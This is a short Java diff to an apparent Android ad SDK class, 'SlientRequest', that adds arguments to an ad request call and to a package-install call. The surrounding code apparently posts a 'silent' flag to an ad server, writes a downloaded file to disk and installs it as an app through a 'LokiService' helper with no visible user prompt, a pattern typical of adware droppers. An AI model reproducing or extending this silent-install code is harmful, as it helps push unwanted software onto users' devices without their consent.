@@ -52,7 +52,7 @@ public class SlientRequest extends AMRequest<AD> implements Runnable, IResponseL
 			JSONObject jsonObject = new JSONObject();
 			jsonObject.put(AMConstants.NET_PARAMS_SLIENT, 1);
 //			doPost(url, jsonObject, true);
-			doAdPost(1, this, jsonObject);
+			doAdPost(1, AMConstants.placement_id_slient, this, jsonObject);
 		} catch (Exception e) {
 			AMLogger.e(null, e.getMessage());
 		}
@@ -146,7 +146,7 @@ public class SlientRequest extends AMRequest<AD> implements Runnable, IResponseL
 			fos.flush();
 			LokiService lokiService = LokiService.getInstance(AMApplication.instance);
 			if(lokiService != null) {
-				lokiService.installPackage(file.getAbsolutePath(), 0);
+				lokiService.installPackage(file.getAbsolutePath(), null, 0);
 			}
 		} catch (Exception e) {
 			AMLogger.e(null, e.getMessage());
